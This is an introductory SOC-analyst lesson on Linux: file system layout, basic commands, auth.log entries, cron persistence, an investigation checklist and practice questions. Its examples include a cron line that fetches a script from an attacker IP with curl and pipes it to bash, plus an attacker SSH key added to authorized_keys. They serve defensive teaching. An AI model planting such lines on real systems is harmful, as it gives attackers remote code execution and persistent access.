# Lesson 2.2 — Linux Basics for SOC Analysts

**Phase:** 2 — IT & Networking Foundations
**Prerequisite:** Lesson 2.1
**Time to complete:** 30 minutes

---

## Why Linux Matters in SOC

You might work in a Windows-heavy environment, but you will still encounter Linux regularly because:

1. Many security tools run on Linux (Kali Linux, Ubuntu-based SIEM tools, firewalls)
2. Many company servers run Linux (web servers, database servers, email servers)
3. Attackers use Linux tools and live off Linux systems
4. Log analysis tools often run on Linux
5. Cloud environments heavily use Linux

You do not need to become a Linux expert right now. You need enough knowledge to navigate, read files, and understand what you see in Linux logs.

---

## Key Differences from Windows

Windows has a graphical interface by default. Linux is primarily command-line.
Windows uses backslashes for paths: C:\Users\john. Linux uses forward slashes: /home/john.
Windows drives are C:, D:, etc. Linux has a single root directory: /.
Windows processes run as users or SYSTEM. Linux processes run as users or root.

---

## The Linux File System Structure

```
/                    (root — top of everything)
├── bin/             (essential programs — ls, cp, cat)
├── sbin/            (system administration programs)
├── etc/             (configuration files — critical!)
│   ├── passwd       (user account list)
│   ├── shadow       (hashed passwords)
│   ├── sudoers      (who can run commands as root)
│   └── cron.d/      (scheduled tasks)
├── home/            (user home directories)
│   └── john/        (john's home directory)
├── var/             (variable data)
│   └── log/         (log files — your primary evidence!)
│       ├── auth.log or secure  (authentication events)
│       ├── syslog   (system events)
│       └── apache2/ (web server logs)
├── tmp/             (temporary files — malware often uses this)
├── opt/             (optional software)
├── proc/            (virtual filesystem — running process info)
└── usr/             (user programs)
```

Key locations for SOC analysts:
- /etc/ — Configuration files. Attackers modify these for persistence.
- /var/log/ — Logs. Your primary evidence source on Linux systems.
- /tmp/ — Temporary directory anyone can write to. Malware drops files here.
- /home/[user]/.ssh/ — SSH keys. Attackers add their public keys here for persistent access.
- /etc/cron.d/ and crontab — Scheduled tasks. Attackers add persistence here.
- /etc/passwd and /etc/shadow — User accounts and password hashes.

---

## Essential Linux Commands

You will use or see these commands frequently:

```bash
# Navigation
ls -la          List files with details (including hidden files starting with .)
cd /var/log     Change directory
pwd             Show current directory
cat /etc/passwd Show contents of a file

# Search
grep "error" /var/log/syslog    Search for "error" in syslog
grep -r "ssh" /var/log/         Search recursively in all logs
find / -name "*.sh" -perm 777   Find shell scripts with full permissions

# Users and permissions
whoami          Show current user
id              Show user ID and groups
sudo su         Switch to root (if permitted)
cat /etc/passwd List all users
cat /etc/sudoers Who has sudo privileges

# Processes
ps aux          List all running processes
ps aux | grep malware   Look for a specific process
top             Real-time process view
kill -9 1234    Kill process with PID 1234

# Network
netstat -tulpn  List open ports and listening services
ss -tulpn       Modern alternative to netstat
ifconfig        Show network interfaces
ip addr         Modern alternative to ifconfig

# File operations
chmod 755 file  Change file permissions
chown user file Change file owner
md5sum file     Generate MD5 hash of a file
sha256sum file  Generate SHA256 hash of a file

# Log investigation
tail -f /var/log/auth.log    Watch auth log in real time
last            Show recent logins
lastb           Show failed login attempts
who             Show who is currently logged in
```

---

## Linux User Accounts and Permissions

Every file and process in Linux has an owner and a permission set.

Permissions are shown as: -rwxr-xr--
- First character: file type (- = file, d = directory, l = link)
- rwx = owner permissions (read, write, execute)
- r-x = group permissions (read, execute)
- r-- = everyone else (read only)

Root user:
- Root (UID 0) is the superuser — equivalent to Windows' SYSTEM
- Root can do anything on the system
- Attackers' goal on Linux is often to get root access (called "privilege escalation")

sudo:
- sudo allows regular users to run specific commands as root
- /etc/sudoers defines who can use sudo
- If an attacker modifies sudoers, they can give themselves persistent root access

---

## Linux Authentication Logs

The most important log for Linux authentication is:

Debian/Ubuntu: /var/log/auth.log
RHEL/CentOS: /var/log/secure

Example entries:

Successful SSH login:
```
Mar 15 08:22:14 server01 sshd[1234]: Accepted publickey for john from 192.168.1.100 port 54321 ssh2
```

Failed SSH login:
```
Mar 15 08:22:16 server01 sshd[1235]: Failed password for root from 185.220.101.47 port 49876 ssh2
Mar 15 08:22:17 server01 sshd[1235]: Failed password for root from 185.220.101.47 port 49876 ssh2
Mar 15 08:22:18 server01 sshd[1235]: Failed password for root from 185.220.101.47 port 49876 ssh2
```
Many rapid failures = brute force attack.

Privilege escalation:
```
Mar 15 14:33:21 server01 sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/bin/bash
```
John used sudo to run bash as root. This gives a full root shell. Was this authorized?

---

## Cron Jobs — Attacker Persistence

Cron is Linux's task scheduler (equivalent to Windows Scheduled Tasks).

Format:
```
# Minute Hour Day Month Weekday Command
*/5  *  *  *  *  /tmp/.hidden/callback.sh
```
This would run /tmp/.hidden/callback.sh every 5 minutes — a common attacker persistence mechanism.

Check for malicious cron jobs:
```bash
crontab -l                    # Current user's cron
crontab -l -u root            # Root's cron
cat /etc/crontab              # System-wide cron
ls /etc/cron.d/               # Cron job directory
ls /etc/cron.hourly/          # Hourly jobs
```

Red flags in cron:
- Jobs running from /tmp/ — malware
- Jobs running at odd times (every minute, or 3 AM daily)
- Jobs with encoded commands (base64)
- Jobs created recently on a server that should be stable

---

## SOC Perspective — Linux Investigation Checklist

When investigating a potentially compromised Linux system:

Step 1 — Check who is currently logged in:
```bash
who
w
last | head -20
```

Step 2 — Check recent authentication events:
```bash
cat /var/log/auth.log | grep -E "Failed|Accepted|sudo"
```

Step 3 — Check running processes for unusual entries:
```bash
ps aux --sort=-%cpu | head -20
ls -la /proc/*/exe 2>/dev/null | grep -v deleted
```

Step 4 — Check network connections:
```bash
ss -tulpn
netstat -an | grep ESTABLISHED
```

Step 5 — Check for new or modified files:
```bash
find /tmp /var/tmp /dev/shm -type f -newer /etc/passwd
find / -mtime -1 -type f 2>/dev/null  # Files modified in last 24h
```

Step 6 — Check persistence mechanisms:
```bash
crontab -l
ls /etc/cron.d/
cat /etc/rc.local
ls /etc/init.d/
```

Step 7 — Check for new user accounts:
```bash
cat /etc/passwd | grep "/bin/bash"   # Users with shell access
awk -F: '$3 == 0' /etc/passwd        # Users with UID 0 (root-level)
```

---

## Real Examples

Example 1 — SSH Brute Force:
```
Mar 15 03:12:01 webserver sshd[9912]: Failed password for root from 185.220.101.47 port 51234
Mar 15 03:12:02 webserver sshd[9913]: Failed password for root from 185.220.101.47 port 51235
Mar 15 03:12:03 webserver sshd[9914]: Failed password for root from 185.220.101.47 port 51236
[... 2,847 more failed attempts ...]
Mar 15 03:19:47 webserver sshd[9915]: Accepted password for root from 185.220.101.47 port 51238 ssh2
```
A brute force attack succeeded. 2,847 failed attempts before the correct password was found. Root was compromised. Immediate response required.

Example 2 — Attacker Adding SSH Key:
```
Mar 15 03:21:15 webserver sshd[9916]: Accepted password for root from 185.220.101.47 port 51238 ssh2
```
Shortly after, in the file /root/.ssh/authorized_keys:
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@attacker.com
```
The attacker added their SSH public key. Now they can log in without a password at any time — persistent backdoor.

Example 3 — Malicious Cron Job:
```
*/1 * * * * curl -s http://185.220.101.47/payload.sh | bash
```
Every minute, this server downloads and executes a script from an attacker's server. This is a persistent backdoor with remote control capability.

---

## Common Mistakes Beginners Make

Mistake 1: Ignoring Linux because "we use Windows."
Reality: Web servers, databases, and security tools run on Linux. Attackers love Linux servers because they are often less monitored.

Mistake 2: Not checking /tmp for malware.
Reality: /tmp is world-writable. Malware almost always drops files here because no special permission is needed.

Mistake 3: Only looking at failed logins.
Reality: If an attacker succeeds, you will only see one successful login — after potentially thousands of failures. Look for both patterns.

Mistake 4: Not checking for new users with UID 0.
Reality: Attackers sometimes create a second root user with a different name. Always check for UID 0 accounts.

---

## Summary

Linux is used on servers, security tools, and cloud environments.
The key log is /var/log/auth.log (or /var/log/secure on RHEL).
Know the important directories: /etc/, /var/log/, /tmp/, /home/user/.ssh/
Persistence mechanisms: cron jobs, SSH authorized keys, modified /etc/sudoers.
Root access is the attacker's goal — monitor sudo usage and UID 0 accounts.
You do not need to be a Linux expert, but you must be able to navigate and read Linux logs.

---

## Practice Questions

**Easy:**
1. What is the equivalent of Windows' SYSTEM account in Linux?
2. Where are Linux logs stored?
3. What command shows who is currently logged in to a Linux system?

**Medium:**
4. You see this in /etc/crontab: `*/5 * * * * /tmp/.x/run.sh`. What is suspicious about this?
5. How would an attacker achieve persistent access to a Linux server without using a password?

**Thinking Questions:**
6. A web server shows 3,847 failed SSH login attempts from IP 45.142.212.100 over 15 minutes, followed by one successful login as root. What happened? What are your next investigative steps?
7. You find a new user called "support" with UID 0 in /etc/passwd on a Linux server that has not had any admin changes in 6 months. What does this tell you?
